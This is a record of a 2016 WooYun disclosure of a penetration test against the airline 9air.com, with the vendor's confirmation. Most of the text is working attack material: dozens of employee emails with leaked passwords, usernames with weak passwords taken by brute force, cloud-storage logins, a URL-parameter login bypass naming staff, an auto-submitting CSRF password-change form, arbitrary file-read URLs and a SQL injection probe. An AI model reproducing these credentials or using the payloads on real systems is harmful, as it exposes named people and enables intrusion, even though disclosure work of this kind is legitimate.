{"id": 87856, "wybug_id": "wooyun-2016-0205283", "wybug_title": "一次对九元航空的渗透测试                                      ", "wybug_corp": "9air.com", "wybug_author": "harbour_bin", "wybug_date": "2016-05-05 14:40", "wybug_open_date": "2016-06-19 15:50", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感接口缺乏校验", "设计不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-05-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-05-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-05-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-05-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-06-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-06-19：\t细节向公众公开  简要描述： 看到九元航空在乌云上注册了, 就测试一下 详细说明：  #1 邮箱信息收集+泄漏密码采集, 获取一下邮箱帐号http://mail.9air.com/\nnoc@9air.com 9air.comliuxunbin@9air.com 9air.comchenxin1@9air.com 9air.comwangren@9air.com 9air.comguoxiaogang@9air.com 9air.comsunli@9air.com 9air.comliumeng@9air.com 9air.comhuanghonghai@9air.com 9air.comlianghanzhao@9air.com 9air.comzhangwenzhao@9air.com 9air.comzhangwenting@9air.com 9air.comwgzp@9air.com 9air.comwgcd@9air.com 9air.comoutstation@9air.com 9air.comhc@9air.com 9air.comwxgcbjb@9air.com 9air.comaqzlc@9air.com 9air.comsongguibin@9air.com 9air.comhuoyunchu@9air.com 9air.comlichaoxu@9air.com 9air.comzhaoyujie@9air.com 9air.comwangxuezi@9air.com 9air.comluojunjie@9air.com 9air.comlixinya@9air.com 9air.comlijiefu@9air.com 9air.comjingxuejun@9air.com 9air.comguowenliang@9air.com 9air.comchenyongcai@9air.com 9air.comwenxudong@9air.com 9air.comjiaomingyi@9air.com 9air.comsunshina@9air.com 9air.combaidu@9air.com 9air.comliangjieming@9air.com 9air.comjiazhenxiu@9air.com 9air.comsms@9air.com jyh9air.comsongkai@9air.com 8air.comwangziping@9air.com 8air.comxiebo@9air.com 8air.comzhujunjie@9air.com 8air.comliuyongqiang@9air.com 8air.comheli@9air.com 8air.comweixinqiye@9air.com 9air.com2015service@9air.com 9air.com2015ppsj@9air.com 9air.com2015\n泄漏敏感文件、通讯录、内网信息和监控信息等\n\n#2 业务逻辑\nhttp://sms.9air.com/oa!aircrewLogin?username=DingJun&airuser.aircrewName=丁军&airuser.aircrewDepartment.aircrewDeptCode=CW05&dutycode=A直接进去了分析后, 发现username、airuser.aircrewName、airuser.aircrewDepartment.aircrewDeptCode三个正确就可以进去了实例1: http://sms.9air.com/oa!aircrewLogin?username=sms&airuser.aircrewName=SMS&airuser.aircrewDepartment.aircrewDeptCode=CW05&dutycode=A实例2:http://sms.9air.com/oa!aircrewLogin?username=gaoweixing&airuser.aircrewName=高卫星&airuser.aircrewDepartment.aircrewDeptCode=CW05&dutycode=A\nSMS\n\n\n\n高卫星\n\ncrew系统修改密码处\nhttp://crew.9air.com/personal_change_password.jsp\n\n<!doctype html><html lang=\"en\"><head>  <meta charset=\"UTF-8\">  <meta name=\"Generator\" content=\"EditPlus®\">  <meta name=\"Author\" content=\"\">  <meta name=\"Keywords\" content=\"\">  <meta name=\"Description\" content=\"\">  <title>Document</title></head><body>    <form method=\"post\" action=\"http://crew.9air.com/personal_change_password.jsp\" id=\"edit\">        <input name=\"newPass\" type=\"text\" value=\"9air.com1\">        <input name=\"validPass\" type=\"text\" value=\"9air.com1\">     </form></body><script>        document.getElementById(\"edit\").submit();</script></html>\nCrew系统, 修改密码处未验证验证原密码, 结合邮箱, 可CSRF实现密码修改#3 文件读取\nsms.9air.com/reqManagement.action?fileName=web.txt&&fileAddr=/WEB-INF/web.xmlsms.9air.com/reqManagement.action?fileName=web.txt&&fileAddr=/WEB-INF/classes/log4j.properties\n\n\n\n\n#4 SQL注入\nhttp://oa.9air.com:8081//services/\n\n\n举例\n\n1' or 'a'='a 结果为41' or 'a'='b 结果为5用户名长度\n\n具体可参考 WooYun: 泛微协同商务系统e-cology某处SQL注入（附验证中转脚本）  WooYun: 泛微OA某接口无需登录可执行任意SQL语句（附脚本） #5 帐号体系控制不严, 进入多个系统http://crew.9air.com/\ndingjun\t9air.comzhaohailiwangxionglixiaomingchenlichenhaolijinglincaoyuanhezhangbenliuyongqiangjiazhenxiulijiayi 888888wangrenliuguangpinglimengkanshizhaojinfengbojiangchaoyangsibozhuxingyansongyuanyangxiangdongwangqiwangyaowuyuhaohoufeiyuliuyiminghudonglicaoningyangjinyangyidongfuyuchenweibincaoyuanheyangjianchenyupeiwenxudongsunshinaliujingwenzhaoyafangyanyuzhangxinyucuiyongtaoqiaozhulijiamingzhaodongchenhejianhanfanliangchangxiaoboxulihaofangxiangyunmaquanxiaohaodiwangyiranlichaoaliangshuangtianmengliuquanhuqigangyangqiningheli 8air.comgechunlian  abc123456liyuzhu 123456hejiangtao 123456liuyingbing a123456\n\n\noa.9air.com举例说明, 还有很多的\n高卫星 9air.com关锋 9air.com\n\n\n\n\nhttp://203.156.207.29:8080/mes/\nPayload1\tPayload2\tStatus\tLengthniejiangnan\taaaa\t200\t18830yanjun\t123456\t200\t15292luochihong\taaaa\t200\t8547xuweibiao\taaaa\t200\t8350huanghe\taaaa\t200\t8344yiniansheng\taaaa\t200\t7868wangchunhui\taaaa\t200\t1035sujianlin\taaaa\t200\t1033liusiqi\taaaa\t200\t1031xuqinghai\taaaa\t200\t1030\n\n\n#5 外围信息\n微云 3091984313或者dingjianchejian@9air.com  密码：dingjianchejian百度云 wgqc@9air.com,密码：9air.com；       wgtm@9air.com，密码：9air.com\n   漏洞证明：  已证明！   修复方案：  1、邮箱弱密码不能只是发邮件, 是否可以强制修改2、业务逻辑部分, 重新设计一下3、OA的SQL注入问题, 联系泛微吧4、多个系统账户体系问题, 添加验证码+修改弱口令5、你们更专业   版权声明：转载请注明来源 harbour_bin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2016-05-05 15:48 厂商回复： 万恶的弱密码。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}